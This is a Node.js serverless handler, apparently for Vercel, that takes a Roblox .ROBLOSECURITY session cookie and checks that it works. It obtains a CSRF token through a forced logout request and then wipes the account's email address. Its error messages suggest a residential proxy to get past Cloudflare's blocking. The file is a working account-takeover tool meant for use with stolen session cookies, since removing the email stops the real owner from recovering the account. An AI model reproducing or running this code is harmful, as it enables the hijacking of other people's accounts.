const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    
    const baseHeaders = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    };

    // FUTURE PROOFING: If you add a PROXY_URL to Vercel env variables, it will use it automatically
    const proxyUrl = process.env.PROXY_URL || null;
    let agent = null;
    if (proxyUrl) {
        agent = new HttpsProxyAgent(proxyUrl);
    }

    try {
        // 1. Verify Cookie (Direct or via Proxy)
        const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
            headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 8000 
        });

        // 2. Get CSRF
        let csrfToken = '';
        try {
            await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 8000 });
        } catch (err) {
            if (err.response && err.response.headers['x-csrf-token']) {
                csrfToken = err.response.headers['x-csrf-token'];
            } else {
                return res.status(400).json({ success: false, message: 'Failed to grab CSRF token. Cookie may be dead.' });
            }
        }

        // 3. Wipe Email
        try {
            await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
                headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrfToken }, 
                httpsAgent: agent, proxy: false, timeout: 8000 
            });
            
            return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
            
        } catch (err) {
            if (err.response && err.response.status === 403) {
                return res.status(403).json({ success: false, message: "Blocked: Roblox requires the account password to remove the email." });
            }
            throw err;
        }

    } catch (error) {
        if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
            return res.status(500).json({ success: false, message: 'Cloudflare blocked Vercel\'s IP. You need a residential proxy to bypass this.' });
        }
        
        if (error.response && error.response.status === 401) {
            return res.status(401).json({ success: false, message: 'Cookie is invalid or expired.' });
        }

        res.status(500).json({ success: false, message: `Error: ${error.message}` });
    }
}
